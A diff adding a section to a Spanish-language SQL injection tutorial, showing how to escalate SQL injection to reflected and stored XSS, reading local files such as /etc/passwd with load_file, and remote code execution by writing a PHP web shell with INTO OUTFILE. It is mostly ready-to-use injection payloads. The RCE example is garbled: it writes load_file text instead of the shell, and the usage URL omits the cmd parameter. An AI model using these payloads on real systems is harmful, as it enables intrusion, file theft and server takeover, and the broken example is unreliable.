@@ -47,6 +47,13 @@
    * [CASE](#CASE)
    * [IF](#IF)
    * [EXTRACTVALUE](#EXTRACTVALUE)
+* [Pasando de Inyección sql a otras vulnerabilidades](#Pasando-de-Inyección-sql-a-otras-vulnerabilidades)
+   * [De Sqli a XSS](#De-Sqli-a-XSS)
+      * [XSS reflectivo](#XSS-reflectivo)
+      * [XSS persistente](#XSS-persistente)  
+   * [De Sqli a LFR](#De-Sqli-a-LFR)
+   * [De Sqli a RCE](#De-Sqli-a-RCE)
+   
 
 ## Antes de comenzar
 
@@ -441,6 +448,73 @@ Con esto en mente, podemos mezclar entre funciones, diferentes tipos de codifica
 
 ## Pasando de Inyección sql a otras vulnerabilidades
 
-###
+### De Sqli a XSS
+
+Cuando tenemos una página vulnerable a inyección sql esta también es vulnerable a inyecciones sql,lo cual puede ser desde el parametro vulnerable pero en este caso vamos a aprobechar la inyección sql para inyectar xss, esto puede ser de 2 maneras:
+
+#### XSS reflectivo   
+
+En la columna vulnerable vamos a inyectar el payload xss que queramos.
+
+"IMPORTANTE" lo tenemos que pasar a hex.
+
+Para el ejemplo vamos a usar este payload:
+
+`<script>alert("_Y000!_")</script>`
+
+Ahora en HEX:
+
+`0x3c7363726970743e616c65727428225f59303030215f22293c2f7363726970743e`
+
+Ejemplo:
+
+`union+select+1,0x3c7363726970743e616c65727428225f59303030215f22293c2f7363726970743e,3+--+`
+
+De esta manera estamos haciendo un xss reflectivo.
+
+#### XSS persistente
+
+Para un xss persistente necesitamos tener permisos de escritura, todo va bien y la página vulnerable nos da permisos tenemos que hacer lo siguiente:
+
+Haciendo uso de la funcion INTO OUTFILE vamos a escribir un archivo en la raiz de la página.
+
+Ejemplo:
+
+`union+select+1,'<script>alert("_Y000!_")</script>',3+INTO+OUTFILE+'ruta/nombre.html'+--+`
+
+Y con eso vamos a crear un archivo .html con nuestro XSS persistente.
+
+### De Sqli a LFR
+
+Sql tambien tiene una funcion que nos permite cargar archivos locales y con eso podemos leer archivos a los que normalmente no deberiamos tener acceso 
+
+Ejemplo: `union all select load_file(‘/etc/passwd’)`
+
+### De Sqli a RCE
+
+Usando el mismo metodo con el que hicimos un xss persistente vamos a hacer lo siguiente:
+
+Vamos a inyectar codigo php con el cual vamos a generar una shell con la que vamos a poder ejecutar comandos dentro del servidor vulnerable
+
+Codigo:  `'<?php system($_GET["cmd"]); ?>'`
+
+Lo vamos a inyectar usando un:
+
+INTO+OUTFILE+'ruta/nombre.php'
+
+Ejemplo: 
+
+`union+select+1,'load_file(‘/etc/passwd’)',3+INTO+OUTFILE+'ruta/nombre.php'+--+`
+
+Por ultimo, para usarlo vamos a la siguiente ruta:
+
+`http://vulnerable.com/nombre.php?=ls`
+
+Como pueden ver, estamos haciendo uso de la shell que inyectamos para ejecutar los comandos.
+
+Para verlo un poco mas grafico, pueden verlo desde aqui: https://twitter.com/_Y000_/status/1249877772979384320
+
+------------------------------------------- 
 
 
+Muchas gracias por dedicarle el tiempo! si tienes alguna sugerencia con gusto puedes decirmela! 
